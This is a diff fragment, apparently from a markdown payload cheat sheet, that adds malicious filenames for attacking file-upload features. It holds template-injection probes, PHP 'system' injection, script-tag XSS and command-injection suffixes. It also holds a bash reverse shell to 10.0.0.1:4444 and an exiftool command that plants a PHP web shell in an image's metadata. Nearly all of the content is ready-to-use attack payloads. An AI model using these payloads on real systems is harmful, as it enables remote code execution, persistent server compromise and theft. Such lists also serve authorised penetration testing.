@@ -799,6 +799,40 @@ xmlns="http://www.w3.org/2000/svg">
 </svg>
 </code>
 ```
+#  shell to SSTI 
+```
+{{2*3}}.jpg
+{2*3}.jpg
+2*3.jpg
+2*3}}.jpg
+2*3}.jpg
+${2*3}.jpg
+"{{2*3}}.jpg
+```
+# php to jpg
+```
+<?php echo system('id');?>.jpg
+"><?php echo system('id');?>.jpg
+```
+>xss to shell
+```
+<script>alert(1)</script>.jpg
+"><script>alert(1)</script>.jpg
+```
+
+# rce
+```
+test.jpg;sleep 10
+test.jpg;sleep+10
+test.jpg;sleep 10#
+test.jpg;sleep 10%00
+test.jpg|sleep 10
+test.jpg%0Asleep 10
+;sleep 10 test.jpg
+```
+
+# Reverse Shell
+test.jpg;bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
 >metadata:
 ```
 exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
